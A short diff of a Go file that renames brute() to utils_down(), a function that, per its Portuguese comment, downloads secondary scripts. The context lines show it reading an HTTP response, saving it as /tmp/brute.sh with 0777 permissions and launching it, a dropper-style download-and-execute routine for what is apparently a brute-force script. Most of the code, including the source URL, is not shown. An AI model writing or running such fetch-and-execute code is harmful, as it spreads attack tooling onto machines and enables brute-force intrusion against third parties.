@@ -14,17 +14,13 @@ import (
 
 
 
+func utils_down() {  //funcao para abaixa sripts  secundarios
 
-
-
-func brute() {
 
 
 
 
 //function no critical
-
-
 
 
 
@@ -59,8 +55,6 @@ script  , err_readall :=  ioutil.ReadAll(resp.Body)
             }
 
 
-
-
 ioutil.WriteFile("/tmp/brute.sh" , script , 0777 )
 
 
@@ -73,6 +67,7 @@ brute.Start()
 
 
 }
+
 
 
 
